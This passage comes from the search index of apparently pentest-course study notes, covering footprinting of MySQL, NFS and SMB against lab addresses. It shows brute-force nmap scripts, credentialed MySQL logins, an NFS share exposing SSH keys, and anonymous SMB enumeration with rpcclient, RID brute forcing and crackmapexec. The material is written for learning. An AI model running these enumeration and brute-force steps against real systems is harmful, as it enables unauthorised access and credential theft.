Configuration"},{"location":"footprinting/mysql/#dangerous-settings","text":"Settings Description     <code>user</code> Sets which user the MySQL service will run as.   <code>password</code> Sets the password for the MySQL user.   <code>admin_address</code> The IP address on which to listen for TCP/IP connections on the administrative network interface.   <code>debug</code> This variable indicates the current debugging settings   <code>sql_warnings</code> This variable controls whether single-row INSERT statements produce an information string if warnings occur.   <code>secure_file_priv</code> This variable is used to limit the effect of data import and export operations.    <p>The settings <code>user</code>, <code>password</code>, and <code>admin_address</code> are security-relevant because the entries are made in plain text. Often, the rights for the configuration file of the MySQL server are not assigned correctly. If we get another way to read files or even a shell, we can see the file and the username and password for the MySQL server.</p>","title":"Dangerous Settings"},{"location":"footprinting/mysql/#footprinting-the-service","text":"<p>Usually, the MySQL server runs on TCP port <code>3306</code></p> <pre><code>secops@kali[/kali]$ sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-21 00:53 CEST\nNmap scan report for 10.129.14.128\nHost is up (0.00021s latency).\n\nPORT     STATE SERVICE     VERSION\n3306/tcp open  nagios-nsca Nagios NSCA\n| mysql-brute: \n|   Accounts: \n|     root:&lt;empty&gt; - Valid credentials\n|_  Statistics: Performed 45010 guesses in 5 seconds, average tps: 9002.0\n|_mysql-databases: ERROR: Script execution failed (use -d to debug)\n|_mysql-dump-hashes: ERROR: Script execution failed (use -d to debug)\n| mysql-empty-password: \n|_  root account has empty password\n| mysql-enum: \n|   Valid usernames: \n|     root:&lt;empty&gt; - Valid credentials\n|     netadmin:&lt;empty&gt; - Valid credentials\n|     guest:&lt;empty&gt; - Valid credentials\n|     user:&lt;empty&gt; - Valid credentials\n|     web:&lt;empty&gt; - Valid credentials\n|     sysadmin:&lt;empty&gt; - Valid credentials\n|     administrator:&lt;empty&gt; - Valid credentials\n|     webadmin:&lt;empty&gt; - Valid credentials\n|     admin:&lt;empty&gt; - Valid credentials\n|     test:&lt;empty&gt; - Valid credentials\n|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0\n| mysql-info: \n|   Protocol: 10\n|   Version: 8.0.26-0ubuntu0.20.04.1\n|   Thread ID: 13\n|   Capabilities flags: 65535\n|   Some Capabilities: SupportsLoadDataLocal, SupportsTransactions, Speaks41ProtocolOld, LongPassword, DontAllowDatabaseTableColumn, Support41Auth, IgnoreSigpipes, SwitchToSSLAfterHandshake, FoundRows, InteractiveClient, Speaks41ProtocolNew, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, LongColumnFlag, SupportsCompression, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults\n|   Status: Autocommit\n|   Salt: YTSgMfqvx\\x0F\\x7F\\x16\\&amp;\\x1EAeK&gt;0\n|_  Auth Plugin Name: caching_sha2_password\n|_mysql-users: ERROR: Script execution failed (use -d to debug)\n|_mysql-variables: ERROR: Script execution failed (use -d to debug)\n|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)\nMAC Address: 00:00:00:00:00:00 (VMware)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 11.21 seconds\n</code></pre> <p>As with all our scans, we must be careful with the results and manually confirm the information obtained because some of the information might turn out to be a false-positive. This scan above is an excellent example of this, as we know for a fact that the target MySQL server does not use an empty password for the user <code>root</code>, but a fixed password. We can test this:</p> <pre><code>secops@kali[/kali]$ mysql -u root -h 10.129.14.132\n\nERROR 1045 (28000): Access denied for user 'root'@'10.129.14.1' (using password: NO)\n</code></pre> <p>If we use a password that we have guessed or found through our research, we will be able to log in:</p> <pre><code>secops@kali[/kali]$ mysql -u root -pP4SSw0rd -h 10.129.14.128\n\nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 150165\nServer version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)                                                         \nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.                                     \nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.                           \n\nMySQL [(none)]&gt; show databases;                                                                          \n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| mysql              |\n| performance_schema |\n| sys                |\n+--------------------+\n4 rows in set (0.006 sec)\n\n\nMySQL [(none)]&gt; select version();\n+-------------------------+\n| version()               |\n+-------------------------+\n| 8.0.27-0ubuntu0.20.04.1 |\n+-------------------------+\n1 row in set (0.001 sec)\n\n\nMySQL [(none)]&gt; use mysql;\nMySQL [mysql]&gt; show tables;\n+------------------------------------------------------+\n| Tables_in_mysql                                      |\n+------------------------------------------------------+\n| columns_priv                                         |\n| component                                            |\n| db                                                   |\n| default_roles                                        |\n| engine_cost                                          |\n| func                                                 |\n| general_log                                          |\n| global_grants                                        |\n| gtid_executed                                        |\n| help_category                                        |\n| help_keyword                                         |\n| help_relation                                        |\n| help_topic                                           |\n| innodb_index_stats                                   |\n| innodb_table_stats                                   |\n| password_history                                     |\n...SNIP...\n| user                                                 |\n+------------------------------------------------------+\n37 rows in set (0.002 sec)\n</code></pre> <p>The most important databases for the MySQL server are the <code>system schema</code> (<code>sys</code>) and <code>information schema</code> (<code>information_schema</code>). The system schema contains tables, information, and metadata necessary for management. More about this database can be found in the reference manual of MySQL.</p> <pre><code>mysql&gt; use sys;\nmysql&gt; show tables;  \n\n+-----------------------------------------------+\n| Tables_in_sys                                 |\n+-----------------------------------------------+\n| host_summary                                  |\n| host_summary_by_file_io                       |\n| host_summary_by_file_io_type                  |\n| host_summary_by_stages                        |\n| host_summary_by_statement_latency             |\n| host_summary_by_statement_type                |\n| innodb_buffer_stats_by_schema                 |\n| innodb_buffer_stats_by_table                  |\n| innodb_lock_waits                             |\n| io_by_thread_by_latency                       |\n...SNIP...\n| x$waits_global_by_latency                     |\n+-----------------------------------------------+\n\n\nmysql&gt; select host, unique_users from host_summary;\n\n+-------------+--------------+                   \n| host        | unique_users |                   \n+-------------+--------------+                   \n| 10.129.14.1 |            1 |                   \n| localhost   |            2 |                   \n+-------------+--------------+                   \n2 rows in set (0,01 sec)  \n</code></pre>    Command Description     <code>mysql -u &lt;user&gt; -p&lt;password&gt; &lt;IP address&gt;</code> Connect to the MySQL server. There should not be a space between the '-p' flag, and the password.   <code>show databases;</code> Show all databases.   <code>use &lt;database&gt;;</code> Select one of the existing databases.   <code>show tables;</code> Show all available tables in the selected database.   <code>show columns from &lt;table&gt;;</code> Show all columns in the selected database.   <code>select * from &lt;table&gt;;</code> Show everything in the desired table.   <code>select * from &lt;table&gt; where &lt;column&gt; = \"&lt;string&gt;\";</code> Search for needed <code>string</code> in the desired table.","title":"Footprinting the Service"},{"location":"footprinting/nfs/","text":"<p>Network File System (NFS) is a network file system developed by Sun Microsystems and has the same purpose as SMB. Its purpose is to access file systems over a network as if they were local. However, it uses an entirely different protocol. NFS is used between Linux and Unix systems. This means that NFS clients cannot communicate directly with SMB servers. </p>","title":"NFS"},{"location":"footprinting/nfs/#dangerous-settings","text":"Option Description     <code>rw</code> Read and write permissions.   <code>insecure</code> Ports above 1024 will be used.   <code>nohide</code> If another file system was mounted below an exported directory, this directory is exported by its own exports entry.   <code>no_root_squash</code> All files created by root are kept with the UID/GID 0.","title":"Dangerous Settings"},{"location":"footprinting/nfs/#footprinting-the-server","text":"<p>When footprinting NFS, the TCP ports <code>111</code> and <code>2049</code> are essential. </p> <pre><code>secops@kali[/kali]$ sudo nmap 10.129.14.128 -p111,2049 -sV -sC\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 17:12 CEST\nNmap scan report for 10.129.14.128\nHost is up (0.00018s latency).\n\nPORT    STATE SERVICE VERSION\n111/tcp open  rpcbind 2-4 (RPC #100000)\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  3,4          111/tcp6  rpcbind\n|   100000  3,4          111/udp6  rpcbind\n|   100003  3           2049/udp   nfs\n|   100003  3           2049/udp6  nfs\n|   100003  3,4         2049/tcp   nfs\n|   100003  3,4         2049/tcp6  nfs\n|   100005  1,2,3      41982/udp6  mountd\n|   100005  1,2,3      45837/tcp   mountd\n|   100005  1,2,3      47217/tcp6  mountd\n|   100005  1,2,3      58830/udp   mountd\n|   100021  1,3,4      39542/udp   nlockmgr\n|   100021  1,3,4      44629/tcp   nlockmgr\n|   100021  1,3,4      45273/tcp6  nlockmgr\n|   100021  1,3,4      47524/udp6  nlockmgr\n|   100227  3           2049/tcp   nfs_acl\n|   100227  3           2049/tcp6  nfs_acl\n|   100227  3           2049/udp   nfs_acl\n|_  100227  3           2049/udp6  nfs_acl\n2049/tcp open  nfs_acl 3 (RPC #100227)\nMAC Address: 00:00:00:00:00:00 (VMware)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 6.58 seconds\n</code></pre> <p>The <code>rpcinfo</code> NSE script retrieves a list of all currently running RPC services, their names and descriptions, and the ports they use. This lets us check whether the target share is connected to the network on all required ports.</p> <pre><code>secops@kali[/kali]$ sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 17:37 CEST\nNmap scan report for 10.129.14.128\nHost is up (0.00021s latency).\n\nPORT     STATE SERVICE VERSION\n111/tcp  open  rpcbind 2-4 (RPC #100000)\n| nfs-ls: Volume /mnt/nfs\n|   access: Read Lookup NoModify NoExtend NoDelete NoExecute\n| PERMISSION  UID    GID    SIZE  TIME                 FILENAME\n| rwxrwxrwx   65534  65534  4096  2021-09-19T15:28:17  .\n| ??????????  ?      ?      ?     ?                    ..\n| rw-r--r--   0      0      1872  2021-09-19T15:27:42  id_rsa\n| rw-r--r--   0      0      348   2021-09-19T15:28:17  id_rsa.pub\n| rw-r--r--   0      0      0     2021-09-19T15:22:30  nfs.share\n|_\n| nfs-showmount: \n|_  /mnt/nfs 10.129.14.0/24\n| nfs-statfs: \n|   Filesystem  1K-blocks   Used       Available   Use%  Maxfilesize  Maxlink\n|_  /mnt/nfs    30313412.0  8074868.0  20675664.0  29%   16.0T        32000\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  3,4          111/tcp6  rpcbind\n|   100000  3,4          111/udp6  rpcbind\n|   100003  3           2049/udp   nfs\n|   100003  3           2049/udp6  nfs\n|   100003  3,4         2049/tcp   nfs\n|   100003  3,4         2049/tcp6  nfs\n|   100005  1,2,3      41982/udp6  mountd\n|   100005  1,2,3      45837/tcp   mountd\n|   100005  1,2,3      47217/tcp6  mountd\n|   100005  1,2,3      58830/udp   mountd\n|   100021  1,3,4      39542/udp   nlockmgr\n|   100021  1,3,4      44629/tcp   nlockmgr\n|   100021  1,3,4      45273/tcp6  nlockmgr\n|   100021  1,3,4      47524/udp6  nlockmgr\n|   100227  3           2049/tcp   nfs_acl\n|   100227  3           2049/tcp6  nfs_acl\n|   100227  3           2049/udp   nfs_acl\n|_  100227  3           2049/udp6  nfs_acl\n2049/tcp open  nfs_acl 3 (RPC #100227)\nMAC Address: 00:00:00:00:00:00 (VMware)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 0.45 seconds\n</code></pre> <p>Once discovered an NFS service, we can mount it on our local machine.</p> <p>Show available NFS Shares <pre><code>secops@kali[/kali]$ showmount -e 10.129.14.128\n\nExport list for 10.129.14.128:\n/mnt/nfs 10.129.14.0/24\n</code></pre></p> <p>Mount NFS Share <pre><code>secops@kali[/kali]$ mkdir target-NFS\nsecops@kali[/kali]$ mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock\nsecops@kali[/kali]$ cd target-NFS\nsecops@kali[/kali]$ tree .\n\n.\n\u2514\u2500\u2500 mnt\n    \u2514\u2500\u2500 nfs\n        \u251c\u2500\u2500 id_rsa\n        \u251c\u2500\u2500 id_rsa.pub\n        \u2514\u2500\u2500 nfs.share\n\n2 directories, 3 files\n</code></pre></p> <p>List Contents with Usernames &amp; Group Names <pre><code>secops@kali[/kali]$ ls -l mnt/nfs/\n\ntotal 16\n-rw-r--r-- 1 root     root     1872 Sep 19 17:27 id_rsa\n-rw-r--r-- 1 root     root      348 Sep 19 17:28 id_rsa.pub\n-rw-r--r-- 1 root     root        0 Sep 19 17:22 nfs.share\n</code></pre></p> <p>List Contents with UIDs &amp; GUIDs <pre><code>secops@kali[/kali]$ ls -n mnt/nfs/\n\ntotal 16\n-rw-r--r-- 1    0    0 1872 Sep 19 17:27 id_rsa\n-rw-r--r-- 1    0    0  348 Sep 19 17:28 id_rsa.pub\n-rw-r--r-- 1    0    0    0 Sep 19 17:22 nfs.share\n</code></pre></p> <p>Unmounting <pre><code>secops@kali[/kali]$ cd ..\nsecops@kali[/kali]$ umount ./target-NFS\n</code></pre></p>","title":"Footprinting the Server"},{"location":"footprinting/smb/","text":"","title":"SMB"},{"location":"footprinting/smb/#dangerous-settings","text":"Setting Description     <code>browseable = yes</code> Allow listing available shares in the current share?   <code>read only = no</code> Forbid the creation and modification of files?   <code>writable = yes</code> Allow users to create and modify files?   <code>guest ok = yes</code> Allow connecting to the service without using a password?   <code>enable privileges = yes</code> Honor privileges assigned to specific SID?   <code>create mask = 0777</code> What permissions must be assigned to the newly created files?   <code>directory mask = 0777</code> What permissions must be assigned to the newly created directories?   <code>logon script = script.sh</code> What script needs to be executed on the user's login?   <code>magic script = script.sh</code> Which script should be executed when the script gets closed?   <code>magic output = script.out</code> Where the output of the magic script needs to be stored?","title":"Dangerous Settings"},{"location":"footprinting/smb/#smbclient-connecting-to-the-share","text":"<p>display a list (<code>-L</code>), null session (<code>-N</code>) which is anonymous access without the input of existing users or valid passwords <pre><code>secops@kali[/kali]$ smbclient -N -L //10.129.14.128\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        print$          Disk      Printer Drivers\n        home            Disk      INFREIGHT Samba\n        dev             Disk      DEVenv\n        notes           Disk      CheckIT\n        IPC$            IPC       IPC Service (DEVSM)\nSMB1 disabled -- no workgroup available\n</code></pre></p> <p>e.g. inspect <code>notes</code> share <pre><code>secops@kali[/kali]$ smbclient //10.129.14.128/notes\n\nEnter WORKGROUP\\&lt;username&gt;'s password: \nAnonymous login successful\nTry \"help\" to get a list of possible commands.\n\n\nsmb: \\&gt; help\n\n?              allinfo        altname        archive        backup         \nblocksize      cancel         case_sensitive cd             chmod          \nchown          close          del            deltree        dir            \ndu             echo           exit           get            getfacl        \ngeteas         hardlink       help           history        iosize         \nlcd            link           lock           lowercase      ls             \nl              mask           md             mget           mkdir          \nmore           mput           newer          notify         open           \nposix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    \nposix_unlink   posix_whoami   print          prompt         put            \npwd            q              queue          quit           readlink       \nrd             recurse        reget          rename         reput          \nrm             rmdir          showacls       setea          setmode        \nscopy          stat           symlink        tar            tarmode        \ntimeout        translate      unlock         volume         vuid           \nwdel           logon          listconnect    showconnect    tcon           \ntdis           tid            utimes         logoff         ..             \n!            \n\n\nsmb: \\&gt; ls\n\n  .                                   D        0  Wed Sep 22 18:17:51 2021\n  ..                                  D        0  Wed Sep 22 12:03:59 2021\n  prep-prod.txt                       N       71  Sun Sep 19 15:45:21 2021\n\n                30313412 blocks of size 1024. 16480084 blocks available\n</code></pre></p> <p>Download with <code>get</code> command, execute local system commands using ! at beginning (<code>!&lt;cmd&gt;</code>)</p> <pre><code>smb: \\&gt; get prep-prod.txt \n\ngetting file \\prep-prod.txt of size 71 as prep-prod.txt (8,7 KiloBytes/sec) \n(average 8,7 KiloBytes/sec)\n\n\nsmb: \\&gt; !ls\n\nprep-prod.txt\n\n\nsmb: \\&gt; !cat prep-prod.txt\n\n[] check your code with the templates\n[] run code-assessment.py\n[] \u2026    \n</code></pre> <p>Check connections using <code>smbstatus</code> <pre><code>root@samba:~# smbstatus\n\nSamba version 4.11.6-Ubuntu\nPID     Username     Group        Machine                                   Protocol Version  Encryption           Signing              \n----------------------------------------------------------------------------------------------------------------------------------------\n75691   sambauser    samba        10.10.14.4 (ipv4:10.10.14.4:45564)      SMB3_11           -                    -                    \n\nService      pid     Machine       Connected at                     Encryption   Signing     \n---------------------------------------------------------------------------------------------\nnotes        75691   10.10.14.4   Do Sep 23 00:12:06 2021 CEST     -            -           \n\nNo locked files\n</code></pre></p>","title":"SMBclient - Connecting to the Share"},{"location":"footprinting/smb/#footprinting-the-service","text":"<p>Nmap <pre><code>secops@kali[/kali]$ sudo nmap 10.129.14.128 -sV -sC -p139,445\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST\nNmap scan report for sharing.LEGALCORP.xyz (10.129.14.128)\nHost is up (0.00024s latency).\n\nPORT    STATE SERVICE     VERSION\n139/tcp open  netbios-ssn Samba smbd 4.6.2\n445/tcp open  netbios-ssn Samba smbd 4.6.2\nMAC Address: 00:00:00:00:00:00 (VMware)\n\nHost script results:\n|_nbstat: NetBIOS name: xyz, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2021-09-19T13:16:04\n|_  start_date: N/A\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 11.35 seconds\n</code></pre></p> <p>RPCclient <pre><code>secops@kali[/kali]$ rpcclient -U \"\" 10.129.14.128\n\nEnter WORKGROUP\\'s password:\nrpcclient $&gt; \n</code></pre></p> <p>RPCclient - Enumeration <pre><code>rpcclient $&gt; srvinfo\n\n        DEVSMB         Wk Sv PrQ Unx NT SNT DEVSM\n        platform_id     :       500\n        os version      :       6.1\n        server type     :       0x809a03\n\n\nrpcclient $&gt; enumdomains\n\nname:[DEVSMB] idx:[0x0]\nname:[Builtin] idx:[0x1]\n\n\nrpcclient $&gt; querydominfo\n\nDomain:         DEVOPS\nServer:         DEVSMB\nComment:        DEVSM\nTotal Users:    2\nTotal Groups:   0\nTotal Aliases:  0\nSequence No:    1632361158\nForce Logoff:   -1\nDomain Server State:    0x1\nServer Role:    ROLE_DOMAIN_PDC\nUnknown 3:      0x1\n\n\nrpcclient $&gt; netshareenumall\n\nnetname: print$\n        remark: Printer Drivers\n        path:   C:\\var\\lib\\samba\\printers\n        password:\nnetname: home\n        remark: INFREIGHT Samba\n        path:   C:\\home\\\n        password:\nnetname: dev\n        remark: DEVenv\n        path:   C:\\home\\sambauser\\dev\\\n        password:\nnetname: notes\n        remark: CheckIT\n        path:   C:\\mnt\\notes\\\n        password:\nnetname: IPC$\n        remark: IPC Service (DEVSM)\n        path:   C:\\tmp\n        password:\n\n\nrpcclient $&gt; netsharegetinfo notes\n\nnetname: notes\n        remark: CheckIT\n        path:   C:\\mnt\\notes\\\n        password:\n        type:   0x0\n        perms:  0\n        max_uses:       -1\n        num_uses:       1\nrevision: 1\ntype: 0x8004: SEC_DESC_DACL_PRESENT SEC_DESC_SELF_RELATIVE \nDACL\n        ACL     Num ACEs:       1       revision:       2\n        ---\n        ACE\n                type: ACCESS ALLOWED (0) flags: 0x00 \n                Specific bits: 0x1ff\n                Permissions: 0x101f01ff: Generic all access SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS \n                SID: S-1-1-0\n</code></pre></p> <p>These examples show us what information can be leaked to anonymous users. Once an anonymous user has access to a network service, it only takes one mistake to give them too many permissions or too much visibility to put the entire network at significant risk.</p> <p>Rpcclient - User Enumeration <pre><code>rpcclient $&gt; enumdomusers\n\nuser:[mrb0b] rid:[0x3e8]\nuser:[cryanight] rid:[0x3e9]\n\n\nrpcclient $&gt; queryuser 0x3e9\n\n        User Name   :   cryanight\n        Full Name   :   cryanight\n        Home Drive  :   \\\\devsmb\\cryanight\n        Dir Drive   :\n        Profile Path:   \\\\devsmb\\cryanight\\profile\n        Logon Script:\n        Description :\n        Workstations:\n        Comment     :\n        Remote Dial :\n        Logon Time               :      Do, 01 Jan 1970 01:00:00 CET\n        Logoff Time              :      Mi, 06 Feb 2036 16:06:39 CET\n        Kickoff Time             :      Mi, 06 Feb 2036 16:06:39 CET\n        Password last set Time   :      Mi, 22 Sep 2021 17:50:56 CEST\n        Password can change Time :      Mi, 22 Sep 2021 17:50:56 CEST\n        Password must change Time:      Do, 14 Sep 30828 04:48:05 CEST\n        unknown_2[0..31]...\n        user_rid :      0x3e9\n        group_rid:      0x201\n        acb_info :      0x00000014\n        fields_present: 0x00ffffff\n        logon_divs:     168\n        bad_password_count:     0x00000000\n        logon_count:    0x00000000\n        padding1[0..7]...\n        logon_hrs[0..21]...\n\n\nrpcclient $&gt; queryuser 0x3e8\n\n        User Name   :   mrb0b\n        Full Name   :\n        Home Drive  :   \\\\devsmb\\mrb0b\n        Dir Drive   :\n        Profile Path:   \\\\devsmb\\mrb0b\\profile\n        Logon Script:\n        Description :\n        Workstations:\n        Comment     :\n        Remote Dial :\n        Logon Time               :      Do, 01 Jan 1970 01:00:00 CET\n        Logoff Time              :      Mi, 06 Feb 2036 16:06:39 CET\n        Kickoff Time             :      Mi, 06 Feb 2036 16:06:39 CET\n        Password last set Time   :      Mi, 22 Sep 2021 17:47:59 CEST\n        Password can change Time :      Mi, 22 Sep 2021 17:47:59 CEST\n        Password must change Time:      Do, 14 Sep 30828 04:48:05 CEST\n        unknown_2[0..31]...\n        user_rid :      0x3e8\n        group_rid:      0x201\n        acb_info :      0x00000010\n        fields_present: 0x00ffffff\n        logon_divs:     168\n        bad_password_count:     0x00000000\n        logon_count:    0x00000000\n        padding1[0..7]...\n        logon_hrs[0..21]...\n</code></pre></p> <p>Rpcclient - Group Information <pre><code>rpcclient $&gt; querygroup 0x201\n\n        Group Name:     None\n        Description:    Ordinary Users\n        Group Attribute:7\n        Num Members:2\n</code></pre></p> <p>Brute Forcing User RIDs <pre><code>secops@kali[/kali]$ for i in $(seq 500 1100);do rpcclient -N -U \"\" 10.129.14.128 -c \"queryuser 0x$(printf '%x\\n' $i)\" | grep \"User Name\\|user_rid\\|group_rid\" &amp;&amp; echo \"\";done\n\n        User Name   :   sambauser\n        user_rid :      0x1f5\n        group_rid:      0x201\n\n        User Name   :   mrb0b\n        user_rid :      0x3e8\n        group_rid:      0x201\n\n        User Name   :   cryanight\n        user_rid :      0x3e9\n        group_rid:      0x201\n</code></pre></p> <p>Alternative: Python script from Impacket called samrdump.py</p> <pre><code>secops@kali[/kali]$ samrdump.py 10.129.14.128\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n[*] Retrieving endpoint list from 10.129.14.128\nFound domain(s):\n . DEVSMB\n . Builtin\n[*] Looking up users in domain DEVSMB\nFound user: mrb0b, uid = 1000\nFound user: cryanight, uid = 1001\nmrb0b (1000)/FullName: \nmrb0b (1000)/UserComment: \nmrb0b (1000)/PrimaryGroupId: 513\nmrb0b (1000)/BadPasswordCount: 0\nmrb0b (1000)/LogonCount: 0\nmrb0b (1000)/PasswordLastSet: 2021-09-22 17:47:59\nmrb0b (1000)/PasswordDoesNotExpire: False\nmrb0b (1000)/AccountIsDisabled: False\nmrb0b (1000)/ScriptPath: \ncryanight (1001)/FullName: cryanight\ncryanight (1001)/UserComment: \ncryanight (1001)/PrimaryGroupId: 513\ncryanight (1001)/BadPasswordCount: 0\ncryanight (1001)/LogonCount: 0\ncryanight (1001)/PasswordLastSet: 2021-09-22 17:50:56\ncryanight (1001)/PasswordDoesNotExpire: False\ncryanight (1001)/AccountIsDisabled: False\ncryanight (1001)/ScriptPath: \n[*] Received 2 entries.\n</code></pre>  <p>The information we have already obtained with <code>rpcclient</code> can also be obtained using other tools. For example, the SMBMap and CrackMapExec tools are also widely used and helpful for the enumeration of SMB services.</p>  <p>SMBmap <pre><code>secops@kali[/kali]$ smbmap -H 10.129.14.128\n\n[+] Finding open SMB ports....\n[+] User SMB session established on 10.129.14.128...\n[+] IP: 10.129.14.128:445       Name: 10.129.14.128                                     \n        Disk                                                    Permissions     Comment\n        ----                                                    -----------     -------\n        print$                                                  NO ACCESS       Printer Drivers\n        home                                                    NO ACCESS       INFREIGHT Samba\n        dev                                                     NO ACCESS       DEVenv\n        notes                                                   NO ACCESS       CheckIT\n        IPC$                                                    NO ACCESS       IPC Service (DEVSM)\n</code></pre></p> <p>CrackMapExec <pre><code>secops@kali[/kali]$ crackmapexec smb 10.129.14.128 --shares -u '' -p ''\n\nSMB         10.129.14.128   445    DEVSMB           [*] Windows 6.1 Build 0 (name:DEVSMB) (domain:) (signing:False) (SMBv1:False)\nSMB         10.129.14.128   445    DEVSMB           [+] \\: \nSMB         10.129.14.128   445    DEVSMB           [+] Enumerated shares\nSMB         10.129.14.128   445    DEVSMB           Share           Permissions     Remark\nSMB         10.129.14.128   445    DEVSMB           -----           -----------     ------\nSMB         10.129.14.128   445    DEVSMB           print$                          Printer Drivers\nSMB         10.129.14.128   445    DEVSMB           home                            INFREIGHT Samba\nSMB         10.129.14.128   445    DEVSMB           dev                             DEVenv\nSMB         10.129.14.128   445    DEVSMB           notes           READ,WRITE      CheckIT\nSMB         10.129.14.128   445    DEVSMB           IPC$                            IPC Service (DEVSM)\n</code></pre></p> <p>enum4linux-ng, which is based on an older tool, enum4linux. This tool automates many of the queries, but not all, and can return a large amount of information.</p> <p>Install <pre><code>secops@kali[/kali]$ git clone https://github.com/cddmp/enum4linux-ng.git\nsecops@kali[/kali]$ cd enum4linux-ng\nsecops@kali[/kali]$ pip3 install -r requirements.txt\n</code></pre></p> <p>Enumeration <pre><code>secops@kali[/kali]$ ./enum4linux-ng.py 10.129.14.128 -A\n\nENUM4LINUX - next generation\n\n ==========================\n|    Target Information    |\n ==========================\n[*] Target ........... 10.129.14.128\n[*] Username ......... ''\n[*] Random Username .. 'juzgtcsu'\n[*] Password ......... ''\n[*] Timeout .......... 5 second(s)\n\n =====================================\n|    Service Scan on 10.129.14.128    |\n =====================================\n[*] Checking LDAP\n[-] Could not connect to LDAP on 389/tcp: connection refused\n[*] Checking LDAPS\n[-] Could not connect to LDAPS on 636/tcp: connection refused\n[*] Checking SMB\n[+] SMB is accessible on 445/tcp\n[*] Checking SMB over NetBIOS\n[+] SMB over NetBIOS is accessible on 139/tcp\n\n =====================================================\n|    NetBIOS Names and Workgroup for 10.129.14.128    |\n =====================================================\n[+] Got domain/workgroup name: DEVOPS\n[+] Full NetBIOS names information:\n- DEVSMB          &lt;00&gt; -         H &lt;ACTIVE&gt;  Workstation Service\n- DEVSMB          &lt;03&gt; -         H &lt;ACTIVE&gt;  Messenger Service\n- DEVSMB          &lt;20&gt; -         H &lt;ACTIVE&gt;  File Server Service\n- ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; H &lt;ACTIVE&gt;  Master Browser\n- DEVOPS          &lt;00&gt; - &lt;GROUP&gt; H &lt;ACTIVE&gt;  Domain/Workgroup Name\n- DEVOPS          &lt;1d&gt; -         H &lt;ACTIVE&gt;  Master Browser\n- DEVOPS          &lt;1e&gt; - &lt;GROUP&gt; H &lt;ACTIVE&gt;  Browser Service Elections\n- MAC Address = 00-00-00-00-00-00\n\n ==========================================\n|    SMB Dialect Check on 10.129.14.128    |\n ==========================================\n[*] Trying on 445/tcp\n[+] Supported dialects and settings:\nSMB 1.0: false\nSMB 2.02: true\nSMB 2.1: true\nSMB 3.0: true\nSMB1 only: false\nPreferred dialect: SMB 3.0\nSMB signing required: false\n\n ==========================================\n|    RPC Session Check on 10.129.14.128    |\n ==========================================\n[*] Check for null session\n[+] Server allows session using username '', password ''\n[*] Check for random user session\n[+] Server allows session using username 'juzgtcsu', password ''\n[H] Rerunning enumeration with user 'juzgtcsu' might give more results\n\n ====================================================\n|    Domain Information via RPC for 10.129.14.128    |\n ====================================================\n[+] Domain: DEVOPS\n[+] SID: NULL SID\n[+] Host is part of a workgroup (not a domain)\n\n ============================================================\n|    Domain Information via SMB session for 10.129.14.128    |\n ============================================================\n[*] Enumerating via unauthenticated SMB session on 445/tcp\n[+] Found domain information via SMB\nNetBIOS computer name: DEVSMB\nNetBIOS domain name: ''\nDNS domain: ''\nFQDN: xyz\n\n ================================================\n|    OS Information via RPC for 10.129.14.128    |\n ================================================\n[*] Enumerating via unauthenticated SMB session on 445/tcp\n[+] Found OS information via SMB\n[*] Enumerating via 'srvinfo'\n[+] Found OS information via 'srvinfo'\n[+] After merging OS information we have the following result:\nOS: Windows 7, Windows Server 2008 R2\nOS version: '6.1'\nOS release: ''\nOS build: '0'\nNative OS: not supported\nNative LAN manager: not supported\nPlatform id: '500'\nServer type: '0x809a03'\nServer type string: Wk Sv PrQ Unx NT SNT DEVSM\n\n ======================================\n|    Users via RPC on 10.129.14.128    |\n ======================================\n[*] Enumerating users via 'querydispinfo'\n[+] Found 2 users via 'querydispinfo'\n[*] Enumerating users via 'enumdomusers'\n[+] Found 2 users via 'enumdomusers'\n[+] After merging user results we have 2 users total:\n'1000':\n  username: mrb0b\n  name: ''\n  acb: '0x00000010'\n  description: ''\n'1001':\n  username: cryanight\n  name: cryanight\n  acb: '0x00000014'\n  description: ''\n\n =======================================\n|    Groups via RPC on 10.129.14.128    |\n =======================================\n[*] Enumerating local groups\n[+] Found 0 group(s) via 'enumalsgroups domain'\n[*] Enumerating builtin groups\n[+] Found 0 group(s) via 'enumalsgroups builtin'\n[*] Enumerating domain groups\n[+] Found 0 group(s) via 'enumdomgroups'\n\n =======================================\n|    Shares via RPC on 10.129.14.128    |\n =======================================\n[*] Enumerating shares\n[+] Found 5 share(s):\nIPC$:\n  comment: IPC Service (DEVSM)\n  type: 